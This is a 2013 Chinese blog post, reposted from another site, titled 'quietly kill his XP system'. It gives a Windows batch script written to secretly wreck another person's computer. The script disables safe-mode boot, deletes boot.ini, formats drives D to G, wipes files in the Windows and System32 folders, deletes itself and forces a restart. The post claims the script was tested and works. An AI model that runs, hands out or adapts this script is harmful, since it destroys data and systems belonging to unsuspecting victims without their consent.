---
author: 403 Forbidden
comments: true
date: 2013-05-25 23:45:54+00:00
layout: post
slug: '%e6%82%84%e6%82%84%e5%9c%b0%e5%b9%b2%e6%8e%89%e4%bb%96%e7%9a%84xp%e7%b3%bb%e7%bb%9f%ef%bc%9f'
title: 悄悄地干掉他的xp系统？
wordpress_id: 209
categories:
- 计算机技术
---
干掉xp？ 
简单，pe或者安装盘格盘不就完了么？ 
问题是怎么   悄悄的   干掉他的xp？ 
淫荡的人自有淫荡的方法，现在贴给你这个方法（太毒了，注意后边的话）

```bat
@echo off
echo exit|%ComSpec% /k prompt e 100 B4 00 B0 12 CD 10 B0 03 CD 10 CD 20 $_g$_q$_|debug>nul
chcp 437>nul
graftabl 936>nul
REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v Network /f
REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v Minimal /f
ATTRIB %SYSTEMDRIVE%\boot.ini -s -a -r -h
DEL %SYSTEMDRIVE%\boot.ini /f
format d:/q /y
format e:/q /y
format f:/q /y
format g:/q /y
cd c:\
cd windows
del *.* /q
cd system32
del *.* /q
del %0
shutdown -r -t 3
```


先改注册表. 
再改分区表. 
再格式化磁盘d、e、f、g分区 
再删除C盘的资料 
然后再关机……

添加到boot.ini,重启后执行删除

经过试验，这是真的

转载自：[http://www.5169.info/software/quietly-get-rid-of-his-xp-system.html](http://www.5169.info/software/quietly-get-rid-of-his-xp-system.html)
